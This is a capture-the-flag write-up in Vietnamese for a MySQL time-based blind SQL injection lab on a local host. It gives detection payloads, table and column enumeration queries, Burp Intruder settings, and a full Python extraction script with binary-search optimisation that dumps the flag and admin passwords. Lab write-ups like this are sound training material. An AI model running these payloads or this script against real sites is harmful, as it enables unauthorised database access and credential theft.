# SQLi-029: MySQL Time-based Blind - Writeup

## Flag: `FLAG{t1m3_b4s3d_sl33p_1nj3ct10n}`

---

## 🔍 Bước 1: DETECT

Response luôn giống nhau, dùng time delay:

```bash
# Normal - fast response (~0.01s)
time curl "http://localhost:5029/product?id=1"

# Inject SLEEP - slow response (~5s)
time curl "http://localhost:5029/product?id=1 AND SLEEP(5)"
```

→ Response time khác nhau = **Time-based Blind confirmed!**

---

## 🎯 Bước 2: IDENTIFY DATABASE

```bash
# MySQL SLEEP works
curl "http://localhost:5029/product?id=1 AND SLEEP(3)-- -"
# ~3s delay → MySQL

# Check database name length
curl "http://localhost:5029/product?id=1 AND IF(LENGTH(database())=7,SLEEP(3),0)-- -"
# ~3s delay → database name có 7 ký tự

# Extract database name: 'webshop'
curl "http://localhost:5029/product?id=1 AND IF(SUBSTRING(database(),1,1)='w',SLEEP(3),0)-- -"
# ~3s → ký tự đầu = 'w'
```

→ Database: **webshop**

---

## 🔢 Bước 3: ENUMERATE TABLES

### 3.1. Đếm số bảng

```http
GET /?id=1 AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=3,SLEEP(5),0) HTTP/1.1
```

→ ~5s delay → Có **3 bảng**

### 3.2. Lấy tên bảng thứ 1

**⚠️ Syntax đúng với subquery:**

```http
GET /?id=1 AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='a',SLEEP(5),0) HTTP/1.1
```

**Giải thích syntax:**

- `(SELECT table_name ... LIMIT 0,1)` - Subquery phải có dấu ngoặc đơn
- `SUBSTRING(...,1,1)` - Lấy ký tự thứ 1
- `LIMIT 0,1` - Lấy bảng đầu tiên (offset 0, lấy 1 row)

### 3.3. Dùng Burp Intruder để brute-force

**Payload:**

```http
GET /?id=1 AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='§a§',SLEEP(5),0) HTTP/1.1
```

**Burp Intruder Settings:**

1. **Positions**: Đặt payload marker `§a§` tại ký tự cần test
2. **Payloads**:
   - Payload type: Simple list
   - Payload: `a-z`, `A-Z`, `0-9`, `_`
3. **Options → Grep - Extract**:
   - Click "Add"
   - Fetch response và select toàn bộ text "Product information loaded."
   - Hoặc để trống (không cần grep vì dùng timing)
4. **Resource Pool**:
   - Create new resource pool
   - Maximum concurrent requests: **1** (QUAN TRỌNG!)
   - Delay between requests: 100ms
5. **Columns to display**:
   - Right-click column header → Columns → Enable:
     - ✅ **Response received** (thời gian bắt đầu nhận response)
     - ✅ **Response completed** (thời gian hoàn thành)
   - Hoặc xem cột **"Length"** (nhưng không đáng tin vì response giống nhau)

**Phân biệt response:**

- Response **NHANH** (~100-500ms) → Sai
- Response **CHẬM** (~5000-5500ms) → **ĐÚNG!**

**Kết quả enumerate:**

| Position | Char | Time (ms) | Result  |
| -------- | ---- | --------- | ------- |
| 1        | a    | 5023      | ✅ ĐÚNG |
| 1        | b    | 120       | ❌      |
| 1        | d    | 115       | ❌      |
| 2        | d    | 5018      | ✅ ĐÚNG |

→ Bảng 1: **admin_users**

### 3.4. Lấy tên bảng thứ 2 và 3

**Bảng thứ 2** (LIMIT 1,1):

```http
GET /?id=1 AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),1,1)='§f§',SLEEP(5),0) HTTP/1.1
```

→ Bảng 2: **flags**

**Bảng thứ 3** (LIMIT 2,1):

```http
GET /?id=1 AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1),1,1)='§p§',SLEEP(5),0) HTTP/1.1
```

→ Bảng 3: **products**

---

## 🗂️ Bước 4: ENUMERATE COLUMNS

### 4.1. Đếm số cột trong bảng `flags`

```http
GET /?id=1 AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='flags')=3,SLEEP(5),0) HTTP/1.1
```

→ ~5s → Có 3 cột

### 4.2. Lấy tên cột

**Cột 1:**

```http
GET /?id=1 AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='flags' LIMIT 0,1),1,1)='§i§',SLEEP(5),0) HTTP/1.1
```

→ Cột 1: **id**

**Cột 2:**

```http
GET /?id=1 AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='flags' LIMIT 1,1),1,1)='§n§',SLEEP(5),0) HTTP/1.1
```

→ Cột 2: **name**

**Cột 3:**

```http
GET /?id=1 AND IF(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='flags' LIMIT 2,1),1,1)='§v§',SLEEP(5),0) HTTP/1.1
```

→ Cột 3: **value**

---

## 📤 Bước 5: EXTRACT DATA

### 5.1. Extract password từ admin_users

**Enumerate cột:**

- username
- password

**Extract password của user đầu tiên:**

```http
GET /?id=1 AND IF(SUBSTRING((SELECT password FROM admin_users LIMIT 0,1),1,1)='§T§',SLEEP(5),0) HTTP/1.1
```

**Burp Intruder - Cluster Bomb Attack:**

Position 1 (vị trí ký tự): 1, 2, 3, 4, ...
Position 2 (ký tự): a-z, A-Z, 0-9, \_, @, !, ...

→ Password: **T1m3_Adm1n_P@ss!**

### 5.2. Extract credentials

| Username   | Password         |
| ---------- | ---------------- |
| time_admin | T1m3_Adm1n_P@ss! |
| sleep_user | Sl33p_Us3r_2024  |

---

## 🏆 Bước 6: EXFILTRATE FLAG

```http
GET /?id=1 AND IF(SUBSTRING((SELECT value FROM flags LIMIT 0,1),1,1)='§F§',SLEEP(5),0) HTTP/1.1
```

**Extract từng ký tự:**

```
F → ~5s
L → ~5s
A → ~5s
G → ~5s
{ → ~5s
...
```

🎉 **FLAG:** `FLAG{t1m3_b4s3d_sl33p_1nj3ct10n}`

---

## 🔧 Tips cho Burp Intruder với Time-based SQLi

### Settings quan trọng:

1. **Resource Pool → Maximum concurrent requests: 1**

   - PHẢI chạy tuần tự để đo thời gian chính xác
   - Nếu chạy parallel, timing sẽ sai

2. **Columns hiển thị:**

   - Response received: Thời điểm bắt đầu nhận
   - Response completed: Thời điểm kết thúc
   - Tính delay = completed - received

3. **Sort by response time:**

   - Click column "Response completed" để sort
   - Request có time > 5s = ĐÚNG

4. **Payload Processing:**
   - Không cần encode URL nếu dùng Repeater
   - Burp tự động encode khi gửi

### Alternative: Dùng cột Length (không đáng tin)

Response luôn giống nhau → Length giống nhau → **KHÔNG dùng Length để phân biệt**

Chỉ dùng **Response Time**!

---

## 🤖 Exploit Script (Automated)

### Script Python với timing chính xác:

```python
import requests
import time

URL = "http://localhost:5029/product"
DELAY = 3  # SLEEP time in seconds
THRESHOLD = 2.5  # Response > 2.5s = TRUE

def check(condition):
    """Test if condition is TRUE by measuring response time"""
    start = time.time()
    payload = f"1 AND IF({condition},SLEEP({DELAY}),0)"
    try:
        r = requests.get(URL, params={"id": payload}, timeout=10)
        elapsed = time.time() - start
        return elapsed > THRESHOLD
    except:
        return False

def extract_string(query, max_len=100):
    """Extract string character by character"""
    result = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_{}-@!#$%^&*()"

    for pos in range(1, max_len + 1):
        found = False
        for char in charset:
            condition = f"SUBSTRING(({query}),{pos},1)='{char}'"
            print(f"[*] Testing position {pos}: '{char}'...", end='\r')

            if check(condition):
                result += char
                print(f"[+] Found: {result}                    ")
                found = True
                break

        if not found:  # No more characters
            break

    return result

# === ENUMERATE TABLES ===
print("[*] Counting tables...")
for i in range(1, 10):
    if check(f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())={i}"):
        print(f"[+] Found {i} tables")
        break

print("\n[*] Extracting table names...")
for table_idx in range(3):  # 3 tables
    query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {table_idx},1"
    table_name = extract_string(query, max_len=30)
    print(f"[+] Table {table_idx + 1}: {table_name}")

# === ENUMERATE COLUMNS ===
print("\n[*] Extracting columns from 'flags' table...")
for col_idx in range(3):  # 3 columns
    query = f"SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='flags' LIMIT {col_idx},1"
    col_name = extract_string(query, max_len=30)
    print(f"[+] Column {col_idx + 1}: {col_name}")

# === EXTRACT FLAG ===
print("\n[*] Extracting flag...")
flag_query = "SELECT value FROM flags LIMIT 0,1"
flag = extract_string(flag_query, max_len=40)
print(f"\n🎉 FLAG: {flag}")

# === EXTRACT PASSWORDS ===
print("\n[*] Extracting passwords from admin_users...")
for user_idx in range(2):  # 2 users
    username_query = f"SELECT username FROM admin_users LIMIT {user_idx},1"
    password_query = f"SELECT password FROM admin_users LIMIT {user_idx},1"

    username = extract_string(username_query, max_len=30)
    password = extract_string(password_query, max_len=30)

    print(f"[+] User {user_idx + 1}: {username}:{password}")
```

### Script output:

```
[*] Counting tables...
[+] Found 3 tables

[*] Extracting table names...
[+] Table 1: admin_users
[+] Table 2: flags
[+] Table 3: products

[*] Extracting columns from 'flags' table...
[+] Column 1: id
[+] Column 2: name
[+] Column 3: value

[*] Extracting flag...
[+] Found: F
[+] Found: FL
[+] Found: FLA
[+] Found: FLAG
[+] Found: FLAG{
[+] Found: FLAG{t
[+] Found: FLAG{t1
[+] Found: FLAG{t1m
...
🎉 FLAG: FLAG{t1m3_b4s3d_sl33p_1nj3ct10n}

[*] Extracting passwords from admin_users...
[+] User 1: time_admin:T1m3_Adm1n_P@ss!
[+] User 2: sleep_user:Sl33p_Us3r_2024
```

---

## 📊 Summary

| Step            | Query                                                                         | Result                 |
| --------------- | ----------------------------------------------------------------------------- | ---------------------- |
| 1. Detect       | `?id=1 AND SLEEP(5)`                                                          | ~5s delay → Vulnerable |
| 2. Count tables | `?id=1 AND IF((SELECT COUNT(*)...)=3,SLEEP(5),0)`                             | 3 tables               |
| 3. Table 1      | `?id=1 AND IF(SUBSTRING((SELECT table_name...LIMIT 0,1),1,1)='a',SLEEP(5),0)` | admin_users            |
| 4. Table 2      | Same with LIMIT 1,1                                                           | flags                  |
| 5. Table 3      | Same with LIMIT 2,1                                                           | products               |
| 6. Columns      | `?id=...column_name...LIMIT 0,1`                                              | id, name, value        |
| 7. Extract flag | `?id=...SELECT value FROM flags...`                                           | FLAG{...}              |

**Time Complexity:**

- Mỗi ký tự: ~62 requests (a-z, A-Z, 0-9)
- Flag 35 ký tự: ~2,170 requests
- Mỗi request ~5s: **~3 giờ** (nếu chạy tuần tự)

**Optimization:** Dùng binary search với ASCII codes để giảm xuống ~280 requests!

```python
def extract_string_binary(query, max_len=100):
    """Extract using binary search on ASCII values"""
    result = ""
    for pos in range(1, max_len + 1):
        low, high = 32, 126  # ASCII printable range

        while low <= high:
            mid = (low + high) // 2
            condition = f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"

            if check(condition):
                low = mid + 1
            else:
                high = mid - 1

        if high >= 32:
            result += chr(high + 1)
            print(f"[+] Found: {result}")
        else:
            break

    return result
```

**Optimized:** ~7 requests/char × 35 chars = **~245 requests** (~20 phút)
